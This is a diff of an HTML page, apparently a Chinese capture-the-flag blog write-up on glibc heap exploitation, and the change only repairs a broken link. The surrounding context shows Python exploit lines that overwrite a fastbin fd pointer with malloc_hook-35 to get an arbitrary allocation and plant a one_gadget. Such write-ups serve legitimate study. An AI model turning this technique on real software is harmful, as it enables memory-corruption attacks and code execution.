@@ -288,7 +288,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x67</span>)<span class="comment">#6 struct chunk =&gt; 0x7ffff7fff090,contenr chunk =&gt; 0x7ffff7fff020</span></span><br><span class="line">edit(<span class="number">6</span>,p64(malloc_hook-<span class="number">35</span>))</span><br><span class="line">add(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x67</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x67</span>)<span class="comment">#8</span></span><br></pre></td></tr></table></figure>
 
 <p>修改fd，使其指向<code>malloc_hook-35</code></p>
-<p>​        这里减去三十五是为了构造fake chunk的size位，使其合法。详情可以参考[fastbin中uaf实现任意地址分配的检测问题][<a href="https://fuurinko.github.io/2022/04/02/fastbin%E4%B8%ADuaf%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E7%9A%84%E6%A3%80%E6%B5%8B%E9%97%AE%E9%A2%98/]%E3%80%82">https://fuurinko.github.io/2022/04/02/fastbin中uaf实现任意地址分配的检测问题/]。</a></p>
+<p>​        这里减去三十五是为了构造fake chunk的size位，使其合法。详情可以看这里的分析：<a href="https://fuurinko.github.io/2022/04/02/fastbin%E4%B8%ADuaf%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E7%9A%84%E6%A3%80%E6%B5%8B%E9%97%AE%E9%A2%98/">https://fuurinko.github.io/2022/04/02/fastbin中uaf实现任意地址分配的检测问题/</a></p>
 <p>​        接着只需要多add几个chunk，并编辑对应chunk为<code>one_gadget</code>即可。</p>
 <p>​        人有点麻。</p>
 <p>​</p>
